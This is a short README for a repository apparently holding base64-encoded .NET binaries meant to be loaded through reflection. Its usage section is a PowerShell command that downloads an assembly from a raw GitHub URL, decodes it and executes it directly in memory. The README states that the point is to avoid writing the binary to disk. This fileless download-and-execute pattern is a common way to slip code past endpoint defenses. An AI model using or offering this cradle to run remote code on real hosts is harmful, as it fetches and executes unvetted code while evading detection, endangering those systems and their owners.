# LookingSharp
This repository has been created to hold all the .net binaries used for Reflection Assembly loading. For this to work the host has to be able to access githubusercontent.com. The reason for adding the Powershell v1.0 is because syswow64 lets you run 32 bit system executables from 64 bit code. sysnative lets you run 64 bit system executables from 32 bit code.


# Usage:
```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
$content = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/felixguerrero12/LookingSharp/master/txt/ProcessManager.txt')
$ProcessManagerAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
[ProcessManager.Program]::Main("".Split())
```

This will remove the step of downloading the binary on disk and just load it straight into memory.
